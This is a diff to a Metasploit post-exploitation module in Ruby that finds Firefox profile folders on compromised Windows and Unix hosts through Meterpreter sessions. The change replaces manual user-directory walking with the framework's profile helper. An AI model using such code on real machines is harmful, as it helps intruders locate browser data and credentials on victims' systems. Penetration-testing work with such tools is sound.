@@ -12,10 +12,12 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/file'
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info(info,
@@ -52,25 +54,17 @@ class Metasploit3 < Msf::Post
 			@platform = :osx
 			paths = enum_users_unix
 		when /win/
-			@platform = :windows
-			if session.type == "shell"
-				print_error "Only meterpreter sessions are supported on Windows hosts"
-				print_error "Try upgrading the session to a Meterpreter session via \"sessions -u <opt>\""
+			if session.type != "meterpreter"
+				print_error "Only meterpreter sessions are supported on windows hosts"
 				return
-			else
-				drive = session.fs.file.expand_path("%SystemDrive%")
-				os = session.sys.config.sysinfo['OS']
 			end
-			if os =~ /Windows 7|Vista|2008/
-				@appdata = '\\AppData\\Roaming'
-				@users = drive + '\\Users'
-			else
-				@appdata = '\\Application Data'
-				@users = drive + '\\Documents and Settings'
+			grab_user_profiles().each do |user|
+				next if user['AppData'] == nil
+				dir=check_firefox(user['AppData'])
+				if dir
+					paths << dir
+				end
 			end
-
-			print_status("Enumerating users checking for Firefox installs...")
-			paths = enum_users_windows
 		else
 			print_error("Unsupported platform #{session.platform}")
 			return
@@ -145,30 +139,7 @@ class Metasploit3 < Msf::Post
 		return paths
 	end
 
-	def enum_users_windows
-		paths = []
-
-		if got_root?
-			session.fs.dir.foreach(@users) do |path|
-				next if path =~ /^\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService$/
-				firefox = @users + "\\" + path + @appdata
-				dir = check_firefox(firefox)
-				if dir
-					dir.each do |p|
-						paths << p
-					end
-				else
-					next
-				end
-			end
-		else # not root
-			print_status("We do not have SYSTEM checking #{whoami} account for Firefox")
-			path = @users + "\\" + whoami + @appdata
-			paths = check_firefox(path)
-		end
-		return paths
-	end
-
+	
 	def check_firefox(path)
 		paths = []
 		path = path + "\\Mozilla\\"
